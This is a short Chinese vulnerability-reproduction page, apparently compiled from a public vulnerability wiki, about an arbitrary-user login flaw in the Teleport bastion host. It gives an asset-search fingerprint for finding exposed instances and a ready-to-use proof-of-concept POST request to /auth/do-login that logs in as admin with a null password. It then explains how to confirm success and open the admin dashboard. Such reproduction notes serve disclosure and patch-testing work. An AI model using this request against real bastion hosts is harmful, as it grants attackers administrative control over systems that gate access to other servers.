---
title: "Teleport堡垒机 do-login 任意用户登录漏洞"
date: 2026-10-18 09:15:21
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Teleport堡垒机-do-login"
tags:
  - "Teleport堡垒机-do-login"
  - "漏洞复现"
---
## 漏洞描述

Teleport堡垒机存在任意用户登录漏洞，攻击者通过构造特殊的请求包可以登录堡垒机获取其他系统权限

## 漏洞影响

```
Teleport Version <= 20220817
```

## 网络测绘

```
app="TELEPORT堡垒机"
```

## 漏洞复现

登录页面

![image-20220824134958109](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241349427.png)

验证POC， captcha参数为验证码

```
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
```

![image-20220824135439227](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241354271.png)

code 返回 0 即为成功，再访问 /dashboard 获取管理员权限

![image-20220824135449199](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202208241354243.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Teleport%E5%A0%A1%E5%9E%92%E6%9C%BA-do-login-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
